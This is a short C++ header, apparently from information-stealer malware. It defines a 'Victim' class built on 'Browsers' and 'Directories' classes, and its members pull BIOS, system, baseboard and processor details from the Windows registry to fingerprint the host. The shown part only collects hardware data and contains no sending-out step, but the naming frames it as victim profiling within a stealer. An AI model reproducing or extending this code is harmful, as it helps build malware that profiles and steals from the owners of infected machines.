#include "Includes.h"
#include "Registry.h"
#include "Browsers.h"
#include "Directories.h"
#pragma once

class Victim : public Browsers, public Directories{
private:
	//SYSTEM
	std::string systemManu = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemManufacturer");
	std::string systemProductName = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName");
	std::string systemVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemVersion");
	std::string systemFamily = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemFamily");
	std::string systemSKU = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemSKU");
	//BIOS
	std::string BIOSVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVersion");
	std::string BIOSVendor = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVendor");
	std::string BIOSReleaseDate = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSReleaseDate");
	//BaseBoard
	std::string BaseBoardVersion = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardVersion");
	std::string BaseBoardManufacturer = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardManufacturer");
	std::string BaseBoardProduct = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardProduct");
	Registers::Key CentralProcessorSubKeys = Registers::RegEnumSubKeys(HKEY_LOCAL_MACHINE, "Hardware\\Description\\System\\CentralProcessor");
};